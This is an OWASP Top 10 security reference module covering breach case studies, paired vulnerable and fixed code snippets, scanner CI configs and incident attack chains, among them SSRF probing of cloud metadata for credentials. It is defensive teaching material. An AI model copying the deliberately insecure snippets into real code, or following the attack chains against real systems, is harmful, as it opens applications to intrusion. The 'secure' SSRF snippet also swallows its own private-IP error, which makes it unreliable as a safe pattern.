# OWASP Top 10 — Security Expertise Module

severity: Critical
applies_to: All
last_updated: 2026-03-08
owasp_version: "2021 (current official), 2025 (latest release)"

---

## 1. Threat Landscape

The OWASP Top 10 is the industry-standard awareness document for web application security risks.
The 2021 edition analyzed ~500,000 applications across 400+ CWEs. The 2025 edition expanded to
589 CWEs with data from 175,000+ CVE records in the National Vulnerability Database.

### A01:2021 — Broken Access Control

Broken Access Control moved from #5 (2017) to #1. On average 3.81% of applications tested had
one or more CWEs in this category, with over 318,000 occurrences. It remains #1 in the 2025
edition with the highest average incidence rate (5.19%) and 215,000+ occurrences.

**Real Breach — Capital One 2019:** A former AWS employee exploited a Server-Side Request Forgery
(SSRF) vulnerability in a misconfigured WAF to query the EC2 instance metadata service. She
retrieved temporary AWS credentials and accessed S3 buckets containing 106 million customer
records including SSNs, bank account numbers, and credit scores. Capital One paid $80 million in
regulatory settlements. The SSRF category was subsequently added to OWASP A01 in the 2025 edition.

**Key CWEs:** CWE-200, CWE-201, CWE-352, CWE-862, CWE-863, CWE-918.

### A02:2021 — Cryptographic Failures

Previously "Sensitive Data Exposure" (a symptom), renamed to focus on the root cause. Covers
failures related to cryptography that lead to exposure of sensitive data or system compromise.

**Real Breach — LastPass 2022-2023:** Attackers compromised a developer account in August 2022,
gaining access to source code and embedded credentials. In November 2022, using information from
the first breach, they compromised a DevOps engineer's personal computer via a vulnerable
third-party package and accessed cloud storage containing customer vault backups. Encrypted
vaults were exfiltrated — those protected by weak master passwords were subsequently cracked.
LastPass settled a $24.5 million class action in 2025.

**Key CWEs:** CWE-259, CWE-327, CWE-328, CWE-331, CWE-760.

### A03:2021 — Injection

Includes SQL injection, NoSQL injection, OS command injection, LDAP injection, and Cross-Site
Scripting (XSS, consolidated from its own 2017 category). Dropped to #5 in the 2025 edition
but remains critically dangerous.

**Real Breach — MOVEit 2023 (CVE-2023-34362):** The Clop ransomware group exploited a critical
SQL injection zero-day in Progress Software's MOVEit Transfer, impacting 95+ million people and
2,700+ organizations including Shell, British Airways, the US Department of Energy, and Johns
Hopkins Health System.

**Real Breach — Equifax 2017 (CVE-2017-5638):** Apache Struts remote code execution via
malicious HTTP Content-Type header. The patch was available for two months before attackers
exploited it, compromising 147.9 million Americans' SSNs, birth dates, and addresses.

**Key CWEs:** CWE-79 (XSS), CWE-89 (SQLi), CWE-77, CWE-78 (OS Command), CWE-917 (EL Injection).

### A04:2021 — Insecure Design

New in 2021. Addresses missing or ineffective security controls at the design level — threat
modeling failures, insecure architecture decisions, missing business logic validation. No amount
of secure code can fix a fundamentally insecure design.

**Example Pattern:** An e-commerce site allows unlimited coupon applications without server-side
validation, trusting client-side logic. A booking system permits race conditions that allow
double-booking through concurrent requests.

**Key CWEs:** CWE-209, CWE-256, CWE-501, CWE-522.

### A05:2021 — Security Misconfiguration

Moved from #6 to #5 in 2021, then to #2 in the 2025 edition. Absorbs the former XML External
Entities (XXE) category. 90% of applications tested had some form of misconfiguration.

**Real Breach — Uber 2022:** An attacker purchased stolen employee credentials from the dark
web, then bypassed MFA through social engineering (MFA fatigue — flooding the employee with push
notifications via WhatsApp). Once inside the VPN, the attacker found PowerShell scripts
containing hardcoded admin credentials for Thycotic PAM, gaining full access to AWS, GCP,
GSuite, Slack, and HackerOne.

**Key CWEs:** CWE-16, CWE-611 (XXE), CWE-1032, CWE-1174.

### A06:2021 — Vulnerable and Outdated Components

Using components with known vulnerabilities. Expanded to "Software Supply Chain Failures" (A03)
in the 2025 edition, covering the full software ecosystem including dependencies, build systems,
and distribution infrastructure.

**Real Breach — SolarWinds 2020:** Nation-state actors (APT29/Cozy Bear) compromised the
SolarWinds Orion build system, inserting the SUNBURST backdoor into legitimate software updates
distributed to ~18,000 organizations including US Treasury, Commerce, and Homeland Security.
The attack persisted undetected for 9+ months.

**Real Breach — Log4Shell 2021 (CVE-2021-44228):** CVSS 10.0. A zero-day RCE in Apache Log4j,
a ubiquitous Java logging library. 93% of cloud enterprise environments were vulnerable. Affected
Amazon, Google, Microsoft cloud services. Exploitation began within hours of disclosure.

**Key CWEs:** CWE-1104, CWE-937.

### A07:2021 — Identification and Authentication Failures

Previously "Broken Authentication." Covers credential stuffing, brute force, weak passwords,
session fixation, and missing MFA.

**Real Breach — Okta 2023:** An employee's personal Gmail was compromised, and because they had
saved work credentials in Chrome and logged into personal accounts on their work laptop, attackers
accessed Okta's support case management system. HAR files containing session tokens were stolen,
enabling session hijacking of 5 customers' accounts. The breach ultimately exposed data for all
Okta support customers.

**Key CWEs:** CWE-287, CWE-384, CWE-798, CWE-306.

### A08:2021 — Software and Data Integrity Failures

New in 2021. Covers assumptions about software updates, critical data, and CI/CD pipelines
without verifying integrity. Includes insecure deserialization (formerly its own 2017 category).

**Example Pattern:** Auto-update mechanisms that do not verify code signatures. CI/CD pipelines
that pull dependencies without hash verification. Applications that deserialize untrusted data.

**Key CWEs:** CWE-502 (Deserialization), CWE-829, CWE-494.

### A09:2021 — Security Logging and Monitoring Failures

Insufficient logging, detection, monitoring, and active response. Without proper logging,
breaches cannot be detected. The Equifax breach persisted undetected for 78 days. Updated to
"Logging & Alerting Failures" in the 2025 edition.

**Key CWEs:** CWE-117, CWE-223, CWE-532, CWE-778.

### A10:2021 — Server-Side Request Forgery (SSRF)

Added from the community survey. Relatively low incidence but high impact potential. Rolled into
A01 (Broken Access Control) in the 2025 edition. Replaced by "Mishandling of Exceptional
Conditions" (A10:2025).

**Key CWEs:** CWE-918.

### Attacker Motivations and Trends

| Motivation          | Trend (2024-2026)                                  |
|--------------------|----------------------------------------------------|
| Financial gain     | Ransomware-as-a-Service, double extortion           |
| Supply chain       | Build system compromise, dependency confusion       |
| Credential theft   | MFA fatigue, session hijacking, infostealer malware |
| Cloud exploitation | SSRF to metadata services, misconfigured IAM        |
| AI-assisted        | Automated vulnerability scanning, phishing at scale |

---

## 2. Core Security Principles

### Defense-in-Depth Layers

```
Layer 1: Network        — WAF, firewall, rate limiting, DDoS protection
Layer 2: Transport      — TLS 1.3, certificate pinning, HSTS
Layer 3: Authentication — MFA, passwordless, session management
Layer 4: Authorization  — RBAC/ABAC, principle of least privilege
Layer 5: Input          — Validation, sanitization, parameterized queries
Layer 6: Application    — Secure defaults, error handling, CSP
Layer 7: Data           — Encryption at rest/transit, tokenization, masking
Layer 8: Monitoring     — SIEM, anomaly detection, audit trails
```

### Fundamental Rules by Category

| OWASP Category            | Core Principle                                          |
|--------------------------|---------------------------------------------------------|
| A01 Broken Access Control | Deny by default. Enforce server-side. Validate ownership.|
| A02 Cryptographic Failures| Encrypt sensitive data at rest and in transit. No custom crypto.|
| A03 Injection             | Never trust input. Parameterize everything. Context-encode output.|
| A04 Insecure Design       | Threat model before code. Abuse cases alongside use cases.|
| A05 Security Misconfig    | Harden defaults. Automate config. No unnecessary features.|
| A06 Vulnerable Components | Track dependencies. Patch within SLA. Verify integrity.  |
| A07 Auth Failures         | MFA everywhere. Secure credential storage. Rate limit auth.|
| A08 Integrity Failures    | Verify signatures. Pin dependencies. Secure CI/CD.       |
| A09 Logging Failures      | Log security events. Centralize. Alert on anomalies.     |
| A10 SSRF                  | Allowlist URLs. Deny internal networks. Sanitize schemes. |

### Zero Trust Principles Applied to OWASP

1. **Never trust, always verify** — Every request must be authenticated and authorized (A01, A07)
2. **Least privilege access** — Grant minimum permissions required (A01, A05)
3. **Assume breach** — Design logging and monitoring as if compromise is inevitable (A09)
4. **Verify explicitly** — Validate all inputs, all signatures, all certificates (A03, A08)
5. **Secure by default** — Ship with security enabled, not as opt-in (A04, A05)

---

## 3. Implementation Patterns

### Secure-by-Default Patterns

**Access Control Pattern — Server-Side Enforcement:**
```
Request → Authentication middleware → Authorization check → Business logic
  ↓ (fail any step)
  → 401/403 response (no information leakage)
```

**Input Validation Pattern — Allowlist-First:**
```
Raw Input → Schema validation (type, length, format)
         → Business rule validation (range, relationship)
         → Context-specific encoding (HTML, SQL, URL, JS)
         → Safe output
```

**Cryptographic Pattern — Envelope Encryption:**
```
Plaintext → Encrypt with Data Encryption Key (DEK)
DEK → Encrypt with Key Encryption Key (KEK)
KEK → Stored in HSM/KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault)
```

### Recommended Libraries by Language

| Concern              | TypeScript/Node.js          | Python                  | Java/Spring          |
|---------------------|-----------------------------|-------------------------|----------------------|
| Input validation     | zod, joi, class-validator   | pydantic, marshmallow   | Bean Validation      |
| SQL parameterization | Prisma, Drizzle, knex       | SQLAlchemy, Django ORM  | JPA/Hibernate        |
| Password hashing     | bcrypt, argon2              | argon2-cffi, bcrypt     | Spring Security      |
| JWT handling         | jose, jsonwebtoken          | PyJWT, authlib          | nimbus-jose-jwt      |
| CSRF protection      | csurf, csrf-csrf            | Django CSRF middleware  | Spring Security CSRF |
| Output encoding      | DOMPurify, he               | markupsafe, bleach      | OWASP Java Encoder   |
| Rate limiting        | express-rate-limit           | django-ratelimit        | Bucket4j             |
| HTTP security headers| helmet                      | django-csp, secure      | Spring Security      |

### Architecture Patterns

**API Gateway Pattern (addresses A01, A03, A05, A07):**
```
Client → API Gateway (auth, rate limit, input validation, WAF)
       → Service mesh (mTLS, circuit breaker)
       → Microservice (business logic only, pre-validated input)
```

**Secrets Management Pattern (addresses A02, A05):**
```
Application → SDK/Sidecar → Vault/KMS → Secrets
                           ↓
                    Audit log (who accessed what, when)
                    Auto-rotation on schedule
                    Lease-based access with TTL
```

**Supply Chain Security Pattern (addresses A06, A08):**
```
Developer → Lockfile with hashes → CI verification
          → SBOM generation → Vulnerability scanning
          → Signed artifacts → Verified deployment
```

---

## 4. Vulnerability Catalog

### 4.1 SQL Injection (CWE-89) — Maps to A03 Injection

**CVSS Range:** 7.5-10.0 | **Prevalence:** Very High

Vulnerable:
```python
# DANGEROUS — string concatenation in SQL
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
```

Secure:
```python
# SAFE — parameterized query
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
```

### 4.2 Cross-Site Scripting / XSS (CWE-79) — Maps to A03 Injection

**CVSS Range:** 4.3-9.6 | **Prevalence:** Very High

Vulnerable:
```typescript
// DANGEROUS — unsanitized HTML insertion
app.get('/search', (req, res) => {
  res.send(`<p>Results for: ${req.query.q}</p>`);
});
```

Secure:
```typescript
// SAFE — context-aware output encoding
import { encode } from 'he';
app.get('/search', (req, res) => {
  res.send(`<p>Results for: ${encode(req.query.q)}</p>`);
});
```

### 4.3 Insecure Direct Object Reference / IDOR (CWE-639) — Maps to A01 Broken Access Control

**CVSS Range:** 5.3-8.6 | **Prevalence:** High

Vulnerable:
```typescript
// DANGEROUS — no ownership check
app.get('/api/orders/:id', async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order);
});
```

Secure:
```typescript
// SAFE — verify resource ownership
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await db.orders.findOne({
    id: req.params.id,
    userId: req.user.id  // Scoped to authenticated user
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});
```

### 4.4 Server-Side Request Forgery (CWE-918) — Maps to A10 SSRF / A01 (2025)

**CVSS Range:** 5.3-9.8 | **Prevalence:** Medium

Vulnerable:
```python
# DANGEROUS — unrestricted URL fetching
import requests
def fetch_url(url):
    return requests.get(url).text  # Can access http://169.254.169.254/
```

Secure:
```python
# SAFE — URL allowlist with scheme and host validation
from urllib.parse import urlparse
ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
ALLOWED_SCHEMES = {"https"}

def fetch_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Invalid URL scheme")
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not in allowlist")
    # Also block private IP ranges
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Internal addresses blocked")
    except ValueError:
        pass  # hostname is not an IP, DNS resolution checked separately
    return requests.get(url, timeout=5, allow_redirects=False).text
```

### 4.5 Insecure Deserialization (CWE-502) — Maps to A08 Integrity Failures

**CVSS Range:** 7.5-10.0 | **Prevalence:** Medium

Vulnerable:
```python
# DANGEROUS — deserializing untrusted pickle data
import pickle
def load_session(data):
    return pickle.loads(data)  # Arbitrary code execution
```

Secure:
```python
# SAFE — use JSON with schema validation
import json
from pydantic import BaseModel

class SessionData(BaseModel):
    user_id: str
    role: str
    expires_at: int

def load_session(data: str) -> SessionData:
    return SessionData.model_validate_json(data)
```

### 4.6 Broken Authentication / Credential Stuffing (CWE-287) — Maps to A07

**CVSS Range:** 7.5-9.8 | **Prevalence:** High

Vulnerable:
```typescript
// DANGEROUS — no rate limiting, timing oracle, reveals user existence
app.post('/login', async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (!user) return res.status(401).json({ error: 'User not found' });
  if (req.body.password !== user.password) {
    return res.status(401).json({ error: 'Wrong password' });
  }
  res.json({ token: generateToken(user) });
});
```

Secure:
```typescript
// SAFE — constant-time comparison, generic errors, rate limiting
import { timingSafeEqual } from 'crypto';
import { verify } from 'argon2';

app.post('/login', rateLimiter({ max: 5, window: '15m' }), async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  // Always hash even if user not found (prevents timing attacks)
  const valid = user ? await verify(user.passwordHash, req.body.password) : false;
  if (!valid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  res.json({ token: generateToken(user) });
});
```

### 4.7 Missing Function-Level Access Control (CWE-862) — Maps to A01

**CVSS Range:** 5.3-8.8 | **Prevalence:** High

Vulnerable:
```typescript
// DANGEROUS — admin endpoint with no authorization check
app.delete('/api/admin/users/:id', async (req, res) => {
  await db.users.delete(req.params.id);
  res.json({ success: true });
});
```

Secure:
```typescript
// SAFE — middleware chain: authenticate, then authorize
app.delete('/api/admin/users/:id',
  authenticate,
  authorize('admin'),
  async (req, res) => {
    await db.users.delete(req.params.id);
    auditLog.record({ action: 'user_deleted', targetId: req.params.id, by: req.user.id });
    res.json({ success: true });
  }
);
```

### 4.8 Security Misconfiguration — Debug Mode (CWE-16) — Maps to A05

Vulnerable:
```python
# DANGEROUS — debug mode in production exposes stack traces, secrets
app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SECRET_KEY'] = 'dev-secret-123'
```

Secure:
```python
# SAFE — environment-driven configuration, no hardcoded secrets
import os
app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = os.environ['FLASK_SECRET_KEY']  # From vault/env
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### 4.9 Insufficient Logging (CWE-778) — Maps to A09

Vulnerable:
```typescript
// DANGEROUS — no logging of security events
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) res.json({ token: createToken(user) });
  else res.status(401).end();
});
```

Secure:
```typescript
// SAFE — structured security event logging
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    logger.info('auth.login.success', {
      userId: user.id, ip: req.ip, userAgent: req.headers['user-agent']
    });
    res.json({ token: createToken(user) });
  } else {
    logger.warn('auth.login.failure', {
      email: req.body.email, ip: req.ip, userAgent: req.headers['user-agent']
    });
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### 4.10 Hardcoded Credentials (CWE-798) — Maps to A07

Vulnerable:
```python
# DANGEROUS — credentials in source code
DB_PASSWORD = "super_secret_prod_password"
API_KEY = "sk-live-abc123def456"
```

Secure:
```python
# SAFE — secrets from environment or vault
import os
DB_PASSWORD = os.environ["DB_PASSWORD"]       # Injected at runtime
API_KEY = vault_client.read("secret/api_key")  # From HashiCorp Vault
```

### 4.11 XML External Entity / XXE (CWE-611) — Maps to A05 Security Misconfiguration

Vulnerable:
```python
# DANGEROUS — XML parser with external entities enabled
from lxml import etree
def parse_xml(xml_string):
    return etree.fromstring(xml_string)  # XXE possible
```

Secure:
```python
# SAFE — disable external entities and DTD processing
from lxml import etree
def parse_xml(xml_string):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    return etree.fromstring(xml_string.encode(), parser=parser)
```

### 4.12 Path Traversal (CWE-22) — Maps to A01 Broken Access Control

Vulnerable:
```typescript
// DANGEROUS — direct path concatenation
app.get('/files/:name', (req, res) => {
  res.sendFile(`/uploads/${req.params.name}`);  // ../../etc/passwd
});
```

Secure:
```typescript
// SAFE — resolve and validate against base directory
import path from 'path';
const UPLOAD_DIR = '/var/app/uploads';

app.get('/files/:name', (req, res) => {
  const filePath = path.resolve(UPLOAD_DIR, req.params.name);
  if (!filePath.startsWith(UPLOAD_DIR)) {
    return res.status(400).json({ error: 'Invalid path' });
  }
  res.sendFile(filePath);
});
```

---

## 5. Security Checklist

### Access Control (A01)
- [ ] All endpoints enforce server-side authorization (not just UI hiding)
- [ ] Resource ownership is verified before granting access
- [ ] CORS is configured with explicit origins (no wildcard in authenticated APIs)
- [ ] Directory listing is disabled on web servers
- [ ] JWT tokens are validated for signature, expiration, audience, and issuer

### Cryptography (A02)
- [ ] All data in transit uses TLS 1.2+ (prefer TLS 1.3)
- [ ] Sensitive data at rest is encrypted with AES-256-GCM or ChaCha20-Poly1305
- [ ] Passwords are hashed with Argon2id, bcrypt (cost 12+), or scrypt
- [ ] No deprecated algorithms in use (MD5, SHA-1, DES, RC4)
- [ ] Encryption keys are managed via KMS/HSM, not hardcoded

### Injection (A03)
- [ ] All SQL queries use parameterized statements or ORM
- [ ] User output is context-encoded (HTML, JS, URL, CSS contexts)
- [ ] Content-Security-Policy header is deployed and tested
- [ ] OS command execution uses allowlisted commands with no shell interpolation

### Design (A04)
- [ ] Threat modeling is performed for new features (STRIDE or PASTA)
- [ ] Rate limiting is applied to all authentication and sensitive endpoints
- [ ] Business logic enforces server-side limits (not client-side only)

### Configuration (A05)
- [ ] Production environments have debug mode disabled
- [ ] Default credentials are changed or removed before deployment
- [ ] Security headers deployed: HSTS, X-Content-Type-Options, X-Frame-Options, CSP
- [ ] Error messages do not expose stack traces, SQL queries, or internal paths

### Dependencies (A06)
- [ ] Dependency scanning runs in CI (npm audit, pip-audit, Snyk, Dependabot)
- [ ] SBOM is generated and maintained for each release
- [ ] Dependencies are pinned with lockfiles and hash verification

### Authentication (A07)
- [ ] MFA is available and enforced for privileged accounts
- [ ] Account lockout or progressive delays after failed login attempts
- [ ] Session tokens are invalidated on logout, password change, and inactivity

### Integrity (A08)
- [ ] CI/CD pipelines require signed commits and verified artifact checksums
- [ ] Auto-update mechanisms validate code signatures before applying

### Logging (A09)
- [ ] Authentication events (success/failure) are logged with timestamps and IPs
- [ ] Log injection is prevented (structured logging, no user input in log format strings)
- [ ] Alerts are configured for anomalous patterns (brute force, privilege escalation)

---

## 6. Tools & Automation

### Static Analysis (SAST)

**Semgrep** — Fast, pattern-based static analysis with OWASP rulesets:
```yaml
# .github/workflows/semgrep.yml
name: Semgrep SAST
on: [pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep
    steps:
      - uses: actions/checkout@v4
      - run: semgrep scan --config p/owasp-top-ten --config p/security-audit --error --json > semgrep-results.json
      - uses: actions/upload-artifact@v4
        with:
          name: semgrep-results
          path: semgrep-results.json
```

Key Semgrep rulesets:
- `p/owasp-top-ten` — Rules mapped to all 10 categories
- `p/security-audit` — Broader security patterns
- `p/typescript` / `p/python` — Language-specific security rules
- `p/secrets` — Hardcoded credentials detection

**CodeQL** — Deep semantic analysis by GitHub:
```yaml
# .github/workflows/codeql.yml
name: CodeQL Analysis
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly Monday 6 AM
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    strategy:
      matrix:
        language: ['javascript-typescript', 'python']
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: security-extended
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3
```

**Tool accuracy benchmarks (2025):**
- CodeQL: 88% accuracy, 5% false positive rate — best for deep semantic analysis
- Semgrep: 82% accuracy, 12% false positive rate — best for speed and custom rules
- Snyk Code: 85% accuracy, 8% false positive rate — best for developer experience

### Dynamic Analysis (DAST)

**OWASP ZAP** — Automated vulnerability scanner:
```yaml
# .github/workflows/zap-scan.yml
name: OWASP ZAP Scan
on:
  schedule:
    - cron: '0 2 * * *'  # Nightly at 2 AM
jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.14.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a -j'
      - name: ZAP Full Scan (weekly)
        if: github.event.schedule == '0 2 * * 0'
        uses: zaproxy/action-full-scan@v0.12.0
        with:
          target: 'https://staging.example.com'
```

### Dependency Scanning (SCA)

**Snyk** — Continuous dependency monitoring:
```yaml
# .github/workflows/snyk.yml
name: Snyk Security
on: [pull_request]
jobs:
  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
```

**Trivy** — Container and filesystem scanning:
```bash
# Scan container image
trivy image --severity HIGH,CRITICAL myapp:latest

# Scan filesystem for vulnerabilities and misconfigurations
trivy fs --security-checks vuln,secret,config .

# Generate SBOM
trivy sbom --format cyclonedx --output sbom.json .
```

### Recommended CI/CD Pipeline

```
PR Created
  ├── Semgrep (SAST) ......... ~30s, blocks PR on high/critical
  ├── npm audit / pip-audit ... ~10s, blocks on high severity
  └── Secret scanning ........ ~15s, blocks on any finding

Merge to main
  ├── CodeQL (deep SAST) ..... ~5min, creates security advisories
  ├── Snyk (SCA) ............. ~2min, opens fix PRs automatically
  └── Container scan (Trivy) . ~1min, blocks deployment on critical

Nightly
  ├── ZAP baseline scan ...... ~10min against staging
  └── Full dependency audit .. ~3min, generates SBOM

Weekly
  └── ZAP full scan .......... ~60min against staging
```

---

## 7. Platform-Specific Guidance

### Web — Express.js / Node.js

```typescript
import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import { doubleCsrf } from 'csrf-csrf';

const app = express();

// A05: Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],       // No 'unsafe-inline' or 'unsafe-eval'
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],  // Clickjacking protection
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }
}));

// A07: Rate limiting
app.use('/api/auth/', rateLimit({ windowMs: 15 * 60 * 1000, max: 10 }));

// A03: CSRF protection
const { doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieOptions: { secure: true, sameSite: 'strict' }
});
app.use(doubleCsrfProtection);

// A03: Body size limits to prevent DoS
app.use(express.json({ limit: '1mb' }));
```

### Web — Django / Python

```python
# settings.py

# A02: Force HTTPS
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# A03: CSRF and XSS protections (enabled by default in Django)
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True

# A05: Security headers
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_BROWSER_XSS_FILTER = True

# A07: Session security
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_AGE = 3600        # 1 hour
SESSION_EXPIRE_AT_BROWSER_CLOSE = True

# A05: Restrict allowed hosts
ALLOWED_HOSTS = ['www.example.com']

# A09: Security logging
LOGGING = {
    'version': 1,
    'handlers': {
        'security': {
            'class': 'logging.handlers.SysLogHandler',
            'address': '/dev/log',
        }
    },
    'loggers': {
        'django.security': {
            'handlers': ['security'],
            'level': 'WARNING',
        }
    }
}
```

### Web — Spring Boot / Java

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // A01: Authorization rules
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            )
            // A07: Session management
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            // A03: CSRF (disable only for stateless JWT APIs)
            .csrf(csrf -> csrf.disable())
            // A05: Security headers
            .headers(headers -> headers
                .contentSecurityPolicy(csp ->
                    csp.policyDirectives("default-src 'self'"))
                .frameOptions(frame -> frame.deny())
                .httpStrictTransportSecurity(hsts ->
                    hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
            );
        return http.build();
    }
}
```

### Mobile — Flutter / Dart

```dart
// A02: Certificate pinning with http_certificate_pinning
import 'package:http_certificate_pinning/http_certificate_pinning.dart';

Future<void> makeSecureRequest() async {
  final response = await SecureHttpClient(
    allowedSHAFingerprints: ['AB:CD:EF:...'], // Pin certificate hash
  ).get(Uri.parse('https://api.example.com/data'));
}

// A07: Secure token storage — use flutter_secure_storage, not SharedPreferences
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

final storage = FlutterSecureStorage(
  aOptions: AndroidOptions(encryptedSharedPreferences: true),
  iOptions: IOSOptions(accessibility: KeychainAccessibility.first_unlock),
);

Future<void> storeToken(String token) async {
  await storage.write(key: 'auth_token', value: token);
}

// A03: Input validation
String? validateEmail(String? value) {
  if (value == null || value.isEmpty) return 'Required';
  final emailRegex = RegExp(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$');
  if (!emailRegex.hasMatch(value)) return 'Invalid email format';
  return null;
}

// A05: Prevent screenshots and screen recording on sensitive screens
import 'package:flutter_windowmanager/flutter_windowmanager.dart';

Future<void> enableSecureMode() async {
  await FlutterWindowManager.addFlags(FlutterWindowManager.FLAG_SECURE);
}
```

### Backend API Security (All Platforms)

```
1. Authentication: OAuth 2.0 + PKCE for SPAs, mTLS for service-to-service
2. Authorization: RBAC at gateway, ABAC at service level
3. Input validation: At the gateway AND at each service boundary
4. Rate limiting: Per-user at gateway, per-endpoint at service
5. Encryption: TLS 1.3 external, mTLS internal, field-level for PII
6. Logging: Correlation IDs across services, structured JSON, no PII in logs
```

---

## 8. Incident Patterns

### Pattern 1: Injection to Data Exfiltration (A03 → A09)

**Attack Chain:**
```
1. Reconnaissance    — Discover input fields, API endpoints
2. Probe             — Submit injection payloads, observe error responses
3. Exploit           — Extract data via UNION-based or blind SQL injection
4. Exfiltrate        — Dump database contents in batches
5. Cover tracks      — Delete or modify logs if accessible
```

**Detection Signals:**
- Unusual SQL error rates in application logs
- Anomalous query patterns (UNION SELECT, SLEEP, BENCHMARK)
- Large result sets returned from normally small queries
- WAF alerts for injection patterns

**Response Playbook:**
1. Block the source IP/token immediately
2. Identify the vulnerable endpoint and patch/disable it
3. Analyze query logs to determine scope of data accessed
4. Check for lateral movement via extracted credentials
5. Notify affected users per breach disclosure requirements

### Pattern 2: Credential Stuffing to Account Takeover (A07 → A01)

**Attack Chain:**
```
1. Obtain credentials — Purchase from dark web breach dumps
2. Automate attacks  — Use credential stuffing tools against login endpoints
3. Bypass MFA        — MFA fatigue, SIM swap, or session hijacking
4. Privilege escalation — Access admin panels, modify permissions
5. Data theft         — Export sensitive data, establish persistence
```

**Detection Signals:**
- Login failure rate spike from distributed IPs
- Multiple accounts accessed from a single IP in short timeframes
- Geographic impossible travel (login from two continents in minutes)
- MFA request floods for a single account

**Response Playbook:**
1. Enable adaptive MFA challenges, block suspicious sessions
2. Force password reset for compromised accounts
3. Review access logs for all affected accounts
4. Check for unauthorized data exports or permission changes
5. Implement CAPTCHA or proof-of-work on login endpoints

### Pattern 3: Supply Chain Compromise (A06 → A08)

**Attack Chain:**
```
1. Identify target    — Popular open-source library or build tool
2. Compromise         — Typosquatting, maintainer account takeover, or build system
3. Inject malware     — Backdoor in dependency update or build artifact
4. Distribute         — Legitimate update channels deliver malicious code
5. Activate           — Backdoor phones home, exfiltrates secrets/data
```

**Detection Signals:**
- Unexpected network connections from application processes
- New or modified dependencies not matching lockfile hashes
- Build artifacts with different checksums than expected
- Anomalous process behavior (new child processes, file system access)

**Real Example — SolarWinds (2020):** SUNBURST backdoor inserted into Orion build system.
Distributed to ~18,000 organizations via legitimate updates. Detected after 9 months by
FireEye when attackers attempted to register a second MFA device on an employee account.

### Pattern 4: SSRF to Cloud Metadata Theft (A10/A01)

**Attack Chain:**
```
1. Discover SSRF     — Find URL-fetching functionality (webhooks, URL preview, PDF gen)
2. Probe internal    — Request http://169.254.169.254/latest/meta-data/ (AWS)
3. Extract creds     — Retrieve IAM role temporary credentials from metadata
4. Pivot             — Use credentials to access S3, RDS, or other cloud services
5. Exfiltrate        — Download sensitive data from cloud storage
```

**Detection Signals:**
- Requests to metadata service IPs (169.254.169.254, metadata.google.internal)
- Unusual IAM API calls from application service roles
- S3/GCS access patterns outside normal application behavior

**Mitigation:** Enforce IMDSv2 (requires token-based access), use VPC endpoints,
deploy allowlists for outbound requests.

